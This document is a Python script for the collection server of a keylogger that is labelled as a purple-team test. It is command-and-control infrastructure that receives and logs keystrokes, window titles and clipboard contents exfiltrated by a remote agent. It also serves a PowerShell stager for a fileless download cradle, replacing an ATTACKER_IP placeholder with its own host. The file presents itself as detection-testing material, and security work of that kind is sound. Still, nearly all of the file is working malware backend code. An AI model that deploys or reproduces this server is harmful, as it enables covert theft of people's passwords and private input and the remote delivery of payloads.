#!/usr/bin/env python3
"""
Purple Team API Keylogger - Collection Server
==============================================
MITRE ATT&CK: T1056.001 (Input Capture: Keylogging)
                T1041     (Exfiltration Over C2 Channel)

Receives keystroke data from the agent over HTTP.
Run this on your purple team C2 box, then point the agent at it.

XDR detections this should trigger:
  - Suspicious listening service on non-standard port
  - Inbound connections carrying keystroke/input data
  - API endpoint receiving encoded exfil payloads
"""

import json
import os
import sys
import base64
import hashlib
import hmac
from datetime import datetime, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# ── Config ──────────────────────────────────────────────────────────
HOST = os.getenv("KL_SERVER_HOST", "0.0.0.0")
PORT = int(os.getenv("KL_SERVER_PORT", "8443"))
AUTH_TOKEN = os.getenv("KL_AUTH_TOKEN", "purpleteam-xdr-test-2024")
LOG_DIR = os.getenv("KL_LOG_DIR", "captured_logs")


def verify_token(token: str) -> bool:
    return hmac.compare_digest(token, AUTH_TOKEN)


class CollectionHandler(BaseHTTPRequestHandler):

    def _send(self, code: int, body: dict):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(body).encode())

    def _auth(self) -> bool:
        token = self.headers.get("X-Auth-Token", "")
        if not verify_token(token):
            self._send(401, {"error": "unauthorized"})
            return False
        return True

    # ── POST /api/keystrokes ────────────────────────────────────────
    def do_POST(self):
        path = urlparse(self.path).path

        if path == "/api/heartbeat":
            return self._handle_heartbeat()
        if path == "/api/keystrokes":
            return self._handle_keystrokes()
        if path == "/api/clipboard":
            return self._handle_clipboard()

        self._send(404, {"error": "not found"})

    def do_GET(self):
        path = urlparse(self.path).path
        if path == "/api/health":
            self._send(200, {
                "status": "ok",
                "purpose": "PURPLE TEAM XDR TEST - NOT MALICIOUS",
                "mitre": "T1056.001",
            })
            return
        if path == "/api/stager":
            return self._serve_stager()
        self._send(404, {"error": "not found"})

    def _read_body(self) -> dict:
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length)
        return json.loads(raw)

    def _handle_heartbeat(self):
        if not self._auth():
            return
        data = self._read_body()
        agent_id = data.get("agent_id", "unknown")
        ts = datetime.now(timezone.utc).isoformat()
        platform = data.get("platform", "?")
        method = data.get("method", "direct")
        print(f"[{ts}] HEARTBEAT from {agent_id} | host={data.get('hostname')} pid={data.get('pid')} platform={platform} method={method}")
        self._send(200, {"status": "ack", "interval": 30})

    def _handle_keystrokes(self):
        if not self._auth():
            return
        data = self._read_body()
        agent_id = data.get("agent_id", "unknown")
        ts = datetime.now(timezone.utc).isoformat()

        keystrokes = data.get("keystrokes", "")
        if data.get("encoding") == "base64":
            keystrokes = base64.b64decode(keystrokes).decode("utf-8", errors="replace")

        window_title = data.get("window_title", "N/A")
        count = len(keystrokes)

        print(f"[{ts}] KEYS from {agent_id} | window=\"{window_title}\" | count={count}")
        print(f"         payload: {keystrokes[:120]}{'...' if count > 120 else ''}")

        self._log_to_file(agent_id, {
            "timestamp": ts,
            "type": "keystrokes",
            "window_title": window_title,
            "keystrokes": keystrokes,
            "count": count,
        })
        self._send(200, {"status": "received", "count": count})

    def _handle_clipboard(self):
        if not self._auth():
            return
        data = self._read_body()
        agent_id = data.get("agent_id", "unknown")
        ts = datetime.now(timezone.utc).isoformat()

        content = data.get("content", "")
        if data.get("encoding") == "base64":
            content = base64.b64decode(content).decode("utf-8", errors="replace")

        print(f"[{ts}] CLIPBOARD from {agent_id} | length={len(content)}")

        self._log_to_file(agent_id, {
            "timestamp": ts,
            "type": "clipboard",
            "content": content[:500],
        })
        self._send(200, {"status": "received"})

    def _log_to_file(self, agent_id: str, entry: dict):
        os.makedirs(LOG_DIR, exist_ok=True)
        safe_id = "".join(c if c.isalnum() or c in "-_" else "_" for c in agent_id)
        path = os.path.join(LOG_DIR, f"{safe_id}.jsonl")
        with open(path, "a") as f:
            f.write(json.dumps(entry) + "\n")

    def _serve_stager(self):
        """Serve the PowerShell stager for fileless download cradle (T1105)."""
        stager_path = os.path.join(os.path.dirname(__file__), "stager.ps1")
        if not os.path.exists(stager_path):
            self._send(404, {"error": "stager not found"})
            return
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        with open(stager_path, "r") as f:
            content = f.read()
        content = content.replace("http://ATTACKER_IP:8443", f"http://{self.headers.get('Host', 'ATTACKER_IP:8443')}")
        self.wfile.write(content.encode())
        ts = datetime.now(timezone.utc).isoformat()
        print(f"[{ts}] STAGER served to {self.client_address[0]}")

    def log_message(self, format, *args):
        pass


def main():
    banner = f"""
╔══════════════════════════════════════════════════════════════╗
║  PURPLE TEAM - API Keylogger Collection Server               ║
║  MITRE ATT&CK: T1056.001 / T1041                            ║
║  FOR AUTHORIZED SECURITY TESTING ONLY                        ║
╠══════════════════════════════════════════════════════════════╣
║  Listening : {HOST}:{PORT:<44}║
║  Auth Token: {AUTH_TOKEN[:20] + '...':<44}║
║  Log Dir   : {LOG_DIR:<44}║
║                                                              ║
║  Endpoints:                                                  ║
║    POST /api/keystrokes  - receive captured keystrokes       ║
║    POST /api/clipboard   - receive clipboard captures        ║
║    POST /api/heartbeat   - agent check-in                    ║
║    GET  /api/health      - server status                     ║
╚══════════════════════════════════════════════════════════════╝
"""
    print(banner)

    server = HTTPServer((HOST, PORT), CollectionHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server shutting down.")
        server.server_close()


if __name__ == "__main__":
    main()
